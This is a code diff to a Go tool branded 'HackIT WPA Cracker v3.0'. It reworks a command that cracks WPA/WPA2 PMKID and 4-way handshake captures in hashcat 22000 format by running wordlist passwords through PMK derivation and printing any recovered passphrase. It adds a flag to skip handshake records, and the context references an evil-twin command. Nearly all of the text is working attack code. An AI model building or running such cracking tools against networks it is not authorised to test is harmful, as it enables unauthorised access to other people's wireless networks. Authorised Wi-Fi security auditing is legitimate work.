@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"os/signal"
@@ -29,139 +30,166 @@ var rootCmd = &cobra.Command{
 
 var crackCmd = &cobra.Command{
 	Use:   "crack [hashfile] [wordlist]",
-	Short: "Crack WPA/WPA2 handshake using dictionary attack",
-	Long:  "Crack WPA/WPA2 PMKID (hc22000 format) with dictionary attack using PBKDF2-SHA1",
+	Short: "Crack WPA/WPA2 handshake with dictionary attack",
+	Long:  "Crack PMKID (WPA*01) or 4-way handshake (WPA*02) in hashcat 22000 format",
 	Args:  cobra.ExactArgs(2),
 	Run: func(cmd *cobra.Command, args []string) {
-		hashfile := args[0]
-		wordlist := args[1]
+		hashfile, wordlist := args[0], args[1]
+		fmt.Println("[+] HackIT WPA Cracker v3.0")
+		fmt.Printf("[*] Hash file: %s\n", hashfile)
+		fmt.Printf("[*] Wordlist:  %s\n", wordlist)
 
-		fmt.Printf("[+] HackIT WPA Cracker v2.0\n")
-		fmt.Printf("[*] Hash file:   %s\n", hashfile)
-		fmt.Printf("[*] Wordlist:    %s\n\n", wordlist)
-
-		hashFile, err := os.Open(hashfile)
+		hashes, err := loadHashLines(hashfile)
 		if err != nil {
-			fmt.Printf("[-] Cannot open hash file: %v\n", err)
+			fmt.Printf("[-] %v\n", err)
 			return
 		}
-		defer hashFile.Close()
-
-		wordFile, err := os.Open(wordlist)
+		words, err := loadWordlist(wordlist)
 		if err != nil {
-			fmt.Printf("[-] Cannot open wordlist: %v\n", err)
+			fmt.Printf("[-] %v\n", err)
 			return
 		}
-		defer wordFile.Close()
+		fmt.Printf("[*] %d hash(es), %d candidate(s)\n\n", len(hashes), len(words))
 
-		scanner := bufio.NewScanner(hashFile)
-		var hashLines []string
-		for scanner.Scan() {
-			line := strings.TrimSpace(scanner.Text())
-			if line != "" && !strings.HasPrefix(line, "#") {
-				hashLines = append(hashLines, line)
-			}
-		}
-
-		if len(hashLines) == 0 {
-			fmt.Println("[-] No valid hash lines found in", hashfile)
-			return
-		}
-
-		fmt.Printf("[+] Loaded %d hash(es)\n", len(hashLines))
-
-		for _, hashLine := range hashLines {
-			pmkidHex, apMac, clientMac, ssid, err := ParseHC22000Line(hashLine)
-			if err != nil {
-				fmt.Printf("[-] Skipping invalid hash line: %v\n", err)
+		anyFound := false
+		for _, line := range hashes {
+			h, perr := ParseHash22000(line)
+			if perr != nil {
+				fmt.Printf("[-] skip: %v\n", perr)
 				continue
 			}
-
-			targetPMKID, err := hexStringToBytes(pmkidHex)
-			if err != nil {
-				fmt.Printf("[-] Invalid PMKID hex: %v\n", err)
-				continue
-			}
-
-			fmt.Printf("\n[*] Cracking SSID: %s\n", ssid)
-			fmt.Printf("[*] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5])
-			fmt.Printf("[*] Target PMKID: %s\n", pmkidHex)
-			fmt.Println("[*] Starting dictionary attack...")
-			fmt.Println()
-
+			ssid := h.SSID
+			fmt.Printf("[*] target SSID=%s BSSID=%s kind=%s pair=%s\n",
+				ssid, formatMAC(h.APMAC), h.Kind, h.MsgPair)
 			start := time.Now()
-			found, password := doCrack(wordlist, ssid, apMac, clientMac, targetPMKID)
-			elapsed := time.Since(start).String()
 
-			PrintCrackResult(found, password, apMac, ssid, elapsed)
+			var password string
+			var tested int64
+			switch h.Kind {
+			case "01":
+				password, tested = crackPMKIDWordlist(h, words)
+			case "02":
+				mode, _ := cmd.Flags().GetBool("pmkid-only")
+				if mode {
+					continue
+				}
+				password, tested = Crack4Way(h, words, func(t, total int64, _ string) bool {
+					elapsed := time.Since(start).Seconds()
+					rate := float64(t) / elapsed
+					fmt.Printf("\r[+] tested %d/%d | %.0f p/s", t, total, rate)
+					return false
+				})
+			default:
+				fmt.Printf("[-] unsupported kind %s\n", h.Kind)
+				continue
+			}
+			fmt.Println()
+			elapsed := time.Since(start).Round(time.Millisecond)
+			if password != "" {
+				anyFound = true
+				printResult(true, password, h.APMAC, ssid, elapsed.String(), tested)
+			} else {
+				printResult(false, "", h.APMAC, ssid, elapsed.String(), tested)
+			}
+		}
+		if anyFound {
+			fmt.Println("\n[+] Done — passphrase recovered")
+		} else {
+			fmt.Println("\n[-] Done — no passphrase matched the wordlist")
 		}
 	},
 }
 
-func doCrack(wordlistPath string, ssid string, apMac []byte, clientMac []byte, targetPMKID []byte) (bool, string) {
-	file, err := os.Open(wordlistPath)
+// loadHashLines reads every non-comment line from a hash file.
+func loadHashLines(path string) ([]string, error) {
+	f, err := os.Open(path)
 	if err != nil {
-		fmt.Printf("[-] Cannot open wordlist: %v\n", err)
-		return false, ""
+		return nil, fmt.Errorf("cannot open hash file: %w", err)
 	}
-	defer file.Close()
+	defer f.Close()
+	var out []string
+	sc := bufio.NewScanner(f)
+	sc.Buffer(make([]byte, 1024*1024), 1024*1024)
+	for sc.Scan() {
+		line := strings.TrimSpace(sc.Text())
+		if line != "" && !strings.HasPrefix(line, "#") {
+			out = append(out, line)
+		}
+	}
+	return out, sc.Err()
+}
 
-	total := 0
+// loadWordlist streams the whole wordlist into memory for repeated passes.
+func loadWordlist(path string) ([]string, error) {
+	f, err := os.Open(path)
+	if err != nil {
+		return nil, fmt.Errorf("cannot open wordlist: %w", err)
+	}
+	defer f.Close()
+	var out []string
+	sc := bufio.NewScanner(f)
+	sc.Buffer(make([]byte, 1024*1024), 1024*1024)
+	for sc.Scan() {
+		w := strings.TrimSpace(sc.Text())
+		if w != "" {
+			out = append(out, w)
+		}
+	}
+	return out, sc.Err()
+}
+
+// crackPMKIDWordlist brute-forces the PMKID side of a WPA*01 record.
+func crackPMKIDWordlist(h *Hash22000, words []string) (string, int64) {
+	var tested int64
 	start := time.Now()
-
-	scanner := bufio.NewScanner(file)
-	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
-
-	for scanner.Scan() {
-		password := strings.TrimSpace(scanner.Text())
-		if password == "" {
-			continue
+	for _, password := range words {
+		tested++
+		pmk := DerivePMK(password, h.SSID)
+		pmkid := ComputePMKID(pmk, h.APMAC, h.STAMAC)
+		if hmacEqual(pmkid, h.MIC) {
+			return password, tested
 		}
-
-		total++
-
-		if total%10000 == 0 {
+		if tested%20000 == 0 {
 			elapsed := time.Since(start).Seconds()
-			rate := float64(total) / elapsed
-			fmt.Printf("\r[+] Tested: %d passwords | Rate: %.0f p/s | Last: %s", total, rate, password)
-		}
-
-		pmk := DerivePMK(password, ssid)
-
-		pmkid := ComputePMKID(pmk, apMac, clientMac)
-
-		if hmacEqual(pmkid, targetPMKID) {
-			fmt.Println()
-			return true, password
+			rate := float64(tested) / elapsed
+			fmt.Printf("\r[+] tested %d | %.0f p/s", tested, rate)
 		}
 	}
+	return "", tested
+}
 
-	return false, ""
+func formatMAC(mac []byte) string {
+	return fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
+}
+
+func printResult(found bool, password string, apMac []byte, ssid string, elapsed string, tested int64) {
+	if found {
+		fmt.Printf("[+] KEY FOUND  SSID=%s  BSSID=%s\n", ssid, formatMAC(apMac))
+		fmt.Printf("[+] PASSPHRASE: %s\n", password)
+	} else {
+		fmt.Printf("[-] no match   SSID=%s  BSSID=%s  (%d tested)\n", ssid, formatMAC(apMac), tested)
+	}
+	fmt.Printf("[*] elapsed %s\n", elapsed)
+}
+
+// PrintCrackResult keeps the historical export used by other workers.
+func PrintCrackResult(found bool, password string, apMac []byte, ssid string, elapsed string) {
+	printResult(found, password, apMac, ssid, elapsed, 0)
 }
 
 func hexStringToBytes(s string) ([]byte, error) {
-	decoded := make([]byte, len(s)/2)
-	for i := 0; i < len(s); i += 2 {
-		var b byte
-		_, err := fmt.Sscanf(s[i:i+2], "%02x", &b)
-		if err != nil {
-			return nil, err
-		}
-		decoded[i/2] = b
-	}
-	return decoded, nil
+	return hex.DecodeString(strings.ReplaceAll(s, ":", ""))
 }
 
 func hmacEqual(a, b []byte) bool {
 	if len(a) != len(b) {
 		return false
 	}
+	var diff byte
 	for i := range a {
-		if a[i] != b[i] {
-			return false
-		}
+		diff |= a[i] ^ b[i]
 	}
-	return true
+	return diff == 0
 }
 
 var modeCmd = &cobra.Command{
@@ -541,6 +569,7 @@ var eviltwinV3Cmd = &cobra.Command{
 }
 
 func init() {
+	crackCmd.Flags().Bool("pmkid-only", false, "skip 4-way (WPA*02) records")
 	rootCmd.AddCommand(crackCmd)
 	rootCmd.AddCommand(modeCmd)
 	rootCmd.AddCommand(auditCmd)
